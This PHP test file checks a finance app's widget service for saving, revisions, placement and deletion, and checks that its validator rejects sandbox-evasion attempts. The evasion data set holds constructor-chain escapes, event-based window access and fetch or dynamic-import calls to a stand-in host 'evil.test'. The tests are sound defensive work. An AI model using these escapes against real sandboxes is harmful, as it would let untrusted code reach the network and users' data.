<?php

use App\Enums\SystemWidget;
use App\Enums\WidgetHeight;
use App\Enums\WidgetOrigin;
use App\Enums\WidgetWidth;
use App\Models\Dashboard;
use App\Models\DashboardWidget;
use App\Models\User;
use App\Models\WidgetDefinition;
use App\Services\Widgets\InvalidWidget;
use App\Services\Widgets\WidgetDefinitionService;

/**
 * @param  array<string, mixed>  $overrides
 * @return array<string, mixed>
 */
function widgetManifest(array $overrides = []): array
{
    return [
        'name' => 'Groceries by month',
        'size' => ['width' => '1/2', 'height' => 'm', 'allowed_widths' => ['1/2', '1/1']],
        'data' => [
            'groceries' => ['endpoint' => 'GET /transactions', 'params' => ['from' => '{{range.from}}'], 'paginate' => 'all'],
        ],
        ...$overrides,
    ];
}

function validWidgetSource(string $fixture = '01-groceries-by-month.tsx'): string
{
    return (string) file_get_contents(base_path("tests/Fixtures/widgets/valid/{$fixture}"));
}

/**
 * A widget whose component body is $jsx after $setup, with the imports the
 * validator's own evasion battery uses (resources/js/widgets/validator/validate-widget.test.ts).
 */
function evasionWidget(string $jsx, string $setup = ''): string
{
    return <<<TSX
        import { useState, useCallback } from 'react';
        import { Bar, BarChart, Tooltip, XAxis } from 'recharts';
        import { Wallet } from 'lucide-react';
        import { get, cn } from '@whisper-money/widget-sdk';

        export default function Widget({ x, data }) {
            {$setup}
            return ({$jsx});
        }
        TSX;
}

/**
 * @return list<array{path: string, message: string, hint?: string}>
 */
function rejectionOf(Closure $save): array
{
    try {
        $save();
    } catch (InvalidWidget $exception) {
        return $exception->errors;
    }

    throw new RuntimeException('The widget was saved.');
}

function widgetService(): WidgetDefinitionService
{
    return app(WidgetDefinitionService::class);
}

describe('saving', function () {
    it('saves a valid widget as its first revision', function () {
        $user = User::factory()->create();

        $widget = widgetService()->create($user, widgetManifest(), validWidgetSource(), WidgetOrigin::Mcp);

        expect($widget->name)->toBe('Groceries by month')
            ->and($widget->revision)->toBe(1)
            ->and($widget->created_via)->toBe(WidgetOrigin::Mcp)
            ->and($widget->compiled_js)->toContain('export{')
            ->and($widget->manifest['data']['groceries']['endpoint'])->toBe('GET /transactions')
            ->and($widget->revisions()->sole())
            ->number->toBe(1)
            ->source->toBe(validWidgetSource())
            ->compiled_js->toBe($widget->compiled_js);
    });

    it('rejects every kind of sandbox evasion with the place and a readable reason', function (string $source, string $fragment) {
        $errors = rejectionOf(fn () => widgetService()->create(User::factory()->create(), widgetManifest(), $source, WidgetOrigin::Mcp));

        expect($errors)->not->toBeEmpty()
            ->and($errors[0]['path'])->toMatch('/^source:\d+:\d+$/')
            ->and(collect($errors)->pluck('message')->implode("\n"))->toContain($fragment)
            ->and(WidgetDefinition::query()->count())->toBe(0);
    })->with([
        'computed brackets' => [evasionWidget("<div>{x[atob('Y29uc3RydWN0b3I=')]}</div>"), 'get('],
        'constructor chain' => [evasionWidget("<div>{[].constructor.constructor('return fetch')()}</div>"), 'constructor'],
        'constructor by destructuring' => [evasionWidget('<div>{c}</div>', 'const { constructor: c } = [];'), 'constructor'],
        'object reflection' => [evasionWidget('<div>{Object.getPrototypeOf(x)}</div>'), 'Only Object.keys'],
        'refs' => ["import { useRef } from 'react';\nexport default function W() { const r = useRef(null); return <div />; }", 'useRef'],
        'ownerDocument from an event' => [evasionWidget('<div onClick={(e) => e.target.ownerDocument.defaultView} />'), 'onClick'],
        'Recharts handler reading the event' => [evasionWidget('<Bar onClick={(d, i, e) => e.view.fetch()} />'), 'onClick'],
        'Tooltip render prop' => [evasionWidget('<Tooltip content={(props) => <div>{props.label}</div>} />'), 'content'],
        'handler by spread' => [evasionWidget('<Bar {...{ onClick: h }} />', 'const h = (d, i, e) => e.view;'), 'Spreading props'],
        'url() in a component style prop' => [evasionWidget("<Tooltip wrapperStyle={{ backgroundImage: 'url(https://evil.test/x)' }} />"), '`backgroundImage` is not allowed'],
        'lucide icon href' => [evasionWidget('<Wallet href="https://evil.test" />'), 'href'],
        'escaped constructor key' => [evasionWidget('<div>{x["\\u0063onstructor"]}</div>'), 'constructor'],
        'tag from a string' => [evasionWidget('<Tag src="https://evil.test" />', "const Tag = 'iframe';"), 'Tag'],
        'svg image href' => [evasionWidget('<svg><image href="https://evil.test/x.png" /></svg>'), 'image'],
        'formAction' => [evasionWidget('<button formAction="https://evil.test">x</button>'), 'formAction'],
        'style backgroundImage' => [evasionWidget("<div style={{ backgroundImage: 'url(https://evil.test)' }} />"), 'backgroundImage'],
        'arbitrary url() class' => [evasionWidget('<div className="bg-[url(https://evil.test)]" />'), 'bg-[url(https://evil.test)]'],
        'network global' => [evasionWidget("<div>{fetch('https://evil.test')}</div>"), 'fetch'],
        'dynamic import' => ["export default function W() { import('https://evil.test/x.js'); return <div />; }", 'import'],
    ]);

    it('refuses a source over the size limit before compiling it', function () {
        $errors = rejectionOf(fn () => widgetService()->create(
            User::factory()->create(),
            widgetManifest(),
            str_repeat('x', WidgetDefinitionService::MaxSourceBytes + 1),
            WidgetOrigin::Mcp,
        ));

        expect($errors)->toHaveCount(1)
            ->and($errors[0])->toMatchArray(['path' => 'source'])
            ->and($errors[0]['message'])->toContain('60,000')
            ->and($errors[0])->toHaveKey('hint');
    });

    it('does not save a manifest that reads an unregistered endpoint or writes', function (string $endpoint, string $fragment) {
        $manifest = widgetManifest(['data' => ['rows' => ['endpoint' => $endpoint]]]);

        $errors = rejectionOf(fn () => widgetService()->create(User::factory()->create(), $manifest, validWidgetSource(), WidgetOrigin::Mcp));

        expect($errors)->toBe([['path' => 'manifest.data.rows.endpoint', 'message' => $errors[0]['message']]])
            ->and($errors[0]['message'])->toContain($fragment)
            ->and(WidgetDefinition::query()->count())->toBe(0);
    })->with([
        'unregistered' => ['GET /users', 'is not available to widgets'],
        'POST' => ['POST /transactions', 'only GET endpoints'],
        'DELETE' => ['DELETE /accounts/{account}', 'only GET endpoints'],
    ]);

    it('hands back the manifest and source errors together', function () {
        $errors = rejectionOf(fn () => widgetService()->create(
            User::factory()->create(),
            widgetManifest(['size' => ['width' => '1/4', 'height' => 'm']]),
            evasionWidget("<div>{fetch('https://evil.test')}</div>"),
            WidgetOrigin::Mcp,
        ));

        expect(collect($errors)->pluck('path')->all())
            ->toContain('manifest.size.width')
            ->and(collect($errors)->pluck('path')->filter(fn (string $path): bool => str_starts_with($path, 'source:')))->not->toBeEmpty();
    });
});

describe('revisions', function () {
    it('saves each change as a new revision and clears the error the old code raised', function () {
        $widget = widgetService()->create(User::factory()->create(), widgetManifest(), validWidgetSource(), WidgetOrigin::Mcp);
        widgetService()->recordError($widget, 1, ['phase' => 'render', 'message' => 'boom', 'stack' => null, 'component_stack' => null]);

        $updated = widgetService()->update($widget, widgetManifest(['name' => 'Net worth']), validWidgetSource('02-net-worth.tsx'), WidgetOrigin::Web);

        expect($updated->revision)->toBe(2)
            ->and($updated->name)->toBe('Net worth')
            ->and($updated->source)->toBe(validWidgetSource('02-net-worth.tsx'))
            ->and($updated->last_error)->toBeNull()
            ->and($updated->revisions()->orderBy('number')->pluck('created_via')->all())->toBe([WidgetOrigin::Mcp, WidgetOrigin::Web]);
    });

    it('keeps the current revision when a change is invalid', function () {
        $widget = widgetService()->create(User::factory()->create(), widgetManifest(), validWidgetSource(), WidgetOrigin::Mcp);

        rejectionOf(fn () => widgetService()->update($widget, widgetManifest(), evasionWidget('<div>{window.name}</div>'), WidgetOrigin::Mcp));

        expect($widget->fresh())
            ->revision->toBe(1)
            ->source->toBe(validWidgetSource())
            ->and($widget->revisions()->count())->toBe(1);
    });

    it('goes back to an earlier revision by saving its content as a new one', function () {
        $widget = widgetService()->create(User::factory()->create(), widgetManifest(), validWidgetSource(), WidgetOrigin::Mcp);
        widgetService()->update($widget, widgetManifest(['name' => 'Net worth']), validWidgetSource('02-net-worth.tsx'), WidgetOrigin::Mcp);

        $reverted = widgetService()->revert($widget, 1, WidgetOrigin::Web);

        expect($reverted)
            ->revision->toBe(3)
            ->name->toBe('Groceries by month')
            ->source->toBe(validWidgetSource())
            ->and($reverted->revisions()->where('number', 3)->sole())
            ->restored_from->toBe(1)
            ->created_via->toBe(WidgetOrigin::Web)
            ->and($reverted->revisions()->count())->toBe(3);
    });

    it('tells which revisions exist when asked for one that does not', function () {
        $widget = widgetService()->create(User::factory()->create(), widgetManifest(), validWidgetSource(), WidgetOrigin::Mcp);

        $errors = rejectionOf(fn () => widgetService()->revert($widget, 7, WidgetOrigin::Web));

        expect($errors[0]['path'])->toBe('revision')
            ->and($errors[0]['message'])->toContain('from 1 to 1');
    });

    it('puts placements back at the default size when the new manifest no longer admits theirs', function () {
        $widget = widgetService()->create(User::factory()->create(), widgetManifest(), validWidgetSource(), WidgetOrigin::Mcp);
        $dashboard = Dashboard::factory()->for($widget->user)->create();
        $placement = widgetService()->place($dashboard, $widget, ['width' => WidgetWidth::Full, 'height' => WidgetHeight::Medium]);

        widgetService()->update($widget, widgetManifest(['size' => ['width' => '1/3', 'height' => 'l']]), validWidgetSource(), WidgetOrigin::Mcp);

        expect($placement->fresh())
            ->width->toBe(WidgetWidth::OneThird)
            ->height->toBe(WidgetHeight::Large);
    });
});

describe('placing', function () {
    it('places a widget at its default size, after the others', function () {
        $widget = WidgetDefinition::factory()->create();
        $dashboard = Dashboard::factory()->for($widget->user)->create();
        DashboardWidget::factory()->for($dashboard)->system(SystemWidget::Cashflow)->create(['position' => 4]);

        $placement = widgetService()->place($dashboard, $widget);

        expect($placement)
            ->widget_definition_id->toBe($widget->id)
            ->width->toBe(WidgetWidth::Half)
            ->height->toBe(WidgetHeight::Medium)
            ->position->toBe(5);
    });

    it('refuses a size the manifest does not admit, another user\'s dashboard and a full dashboard', function (Closure $setUp, string $path) {
        $widget = WidgetDefinition::factory()->create();
        [$dashboard, $size] = $setUp($widget);

        $placed = $dashboard->widgets()->count();

        $errors = rejectionOf(fn () => widgetService()->place($dashboard, $widget, $size));

        expect($errors[0]['path'])->toBe($path)
            ->and($dashboard->widgets()->count())->toBe($placed);
    })->with([
        'size' => [fn (WidgetDefinition $widget) => [Dashboard::factory()->for($widget->user)->create(), ['width' => WidgetWidth::OneThird, 'height' => WidgetHeight::Medium]], 'size'],
        'another user' => [fn () => [Dashboard::factory()->create(), null], 'widget'],
        'full' => [function (WidgetDefinition $widget) {
            $dashboard = Dashboard::factory()->for($widget->user)->create();
            DashboardWidget::factory()->for($dashboard)->count(Dashboard::MAX_WIDGETS)->sequence(fn ($sequence) => ['position' => $sequence->index])->create([
                'system_widget' => null,
                'widget_definition_id' => $widget->id,
            ]);

            return [$dashboard, null];
        }, 'dashboard'],
    ]);
});

describe('runtime errors', function () {
    it('keeps the error with the revision it happened in, and drops one from an older revision', function () {
        $widget = WidgetDefinition::factory()->create(['revision' => 2]);
        $error = ['phase' => 'render', 'message' => 'Cannot read properties of undefined', 'stack' => 'at Widget', 'component_stack' => null];

        expect(widgetService()->recordError($widget, 1, $error))->toBeFalse()
            ->and($widget->fresh()->last_error)->toBeNull()
            ->and(widgetService()->recordError($widget, 2, $error))->toBeTrue()
            ->and($widget->fresh()->last_error)->toEqual(['revision' => 2, ...$error])
            ->and($widget->fresh()->last_error_at)->not->toBeNull();
    });
});

describe('deleting', function () {
    it('takes a deleted widget off every dashboard', function () {
        $widget = WidgetDefinition::factory()->create();
        $placement = widgetService()->place(Dashboard::factory()->for($widget->user)->create(), $widget);

        $widget->delete();

        expect(DashboardWidget::find($placement->id))->toBeNull()
            ->and($widget->revisions()->count())->toBe(0);
    });

    it('deletes the user\'s widgets and dashboards with the account', function () {
        $widget = WidgetDefinition::factory()->create();
        $dashboard = Dashboard::factory()->for($widget->user)->create();
        widgetService()->place($dashboard, $widget);
        $other = WidgetDefinition::factory()->create();

        $widget->user->markAsDeleted();

        expect(WidgetDefinition::find($widget->id))->toBeNull()
            ->and(Dashboard::find($dashboard->id))->toBeNull()
            ->and(WidgetDefinition::find($other->id))->not->toBeNull();
    });

    it('cascades from the user when the row itself goes', function () {
        $widget = WidgetDefinition::factory()->create();

        $widget->user->forceDelete();

        expect(WidgetDefinition::find($widget->id))->toBeNull();
    });
});
